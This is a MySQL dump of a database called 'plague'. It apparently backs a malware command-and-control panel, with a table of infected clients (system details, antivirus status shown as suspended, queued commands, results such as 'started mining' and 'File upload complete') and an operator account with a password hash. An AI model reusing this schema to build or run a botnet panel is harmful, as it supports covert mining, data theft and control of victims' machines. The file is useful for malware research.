-- MySQL dump 10.16  Distrib 10.1.36-MariaDB, for Win32 (AMD64)
--
-- Host: localhost    Database: plague
-- ------------------------------------------------------
-- Server version	10.1.36-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `clients`
--

DROP TABLE IF EXISTS `clients`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `clients` (
  `GUID` varchar(40) COLLATE utf8_bin NOT NULL,
  `Nickname` text COLLATE utf8_bin NOT NULL,
  `IPAddress` varchar(45) COLLATE utf8_bin NOT NULL,
  `OperatingSystem` varchar(255) COLLATE utf8_bin NOT NULL,
  `ComputerName` varchar(255) COLLATE utf8_bin NOT NULL,
  `Username` varchar(255) COLLATE utf8_bin NOT NULL,
  `CPU` varchar(255) COLLATE utf8_bin NOT NULL,
  `GPU` varchar(255) COLLATE utf8_bin NOT NULL,
  `Antivirus` varchar(255) COLLATE utf8_bin NOT NULL,
  `Defences` text COLLATE utf8_bin NOT NULL,
  `Location` varchar(255) COLLATE utf8_bin NOT NULL,
  `Infected` varchar(40) COLLATE utf8_bin NOT NULL,
  `LastSeen` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `Commands` text COLLATE utf8_bin NOT NULL,
  `Result` varchar(255) COLLATE utf8_bin NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `clients`
--

LOCK TABLES `clients` WRITE;
/*!40000 ALTER TABLE `clients` DISABLE KEYS */;
INSERT INTO `clients` VALUES ('BAA8936B-6C14-4122-9599-EF5C6096D18B','Doctor-BAA8936B','192.168.1.12','Microsoft Windows 7 Ultimate  64-bit (Service Pack 1)','USER-PC','User','Intel(R) Core(TM) i5-4670K CPU @ 3.40GHz','AMD Radeon R9 200 Series','ESET Security','Antivirus - Suspended, Up To Date','[??] Unknown','FD897E0B-DA25-4407-BA9B-7AF21989EE23','2018-11-18 15:00:41','[General]\r\nCommandCount=0\r\nCommands=\r\n\r\n','[P7] started mining!'),('89B98763-9603-492F-9494-0BF182532B69','Doctor-89B98763','192.168.1.11','Microsoft Windows 10 Home 64-bit','HP-ENVY_M4','Win10','Intel(R) Core(TM) i7-3632QM CPU @ 2.20GHz','Intel(R) HD Graphics 4000','Windows Defender','Auto-Update, Antivirus - Suspended, Up To Date','[??] Unknown','FD897E0B-DA25-4407-BA9B-7AF21989EE23','2018-11-18 15:00:00','[General]\r\nCommandCount=0\r\nCommands=\r\n\r\n','File upload complete.');
/*!40000 ALTER TABLE `clients` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `Username` varchar(255) COLLATE utf8_bin NOT NULL,
  `Password` varchar(101) COLLATE utf8_bin NOT NULL,
  `Infection` varchar(40) COLLATE utf8_bin NOT NULL,
  `Created` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES ('Raffy','83F4B0E3529DF15F25D5E4F69E7AEFEC1C513ED7DE587D8C3963D42FD306C931','Something','2018-10-28 18:32:23');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2018-11-23 15:46:57
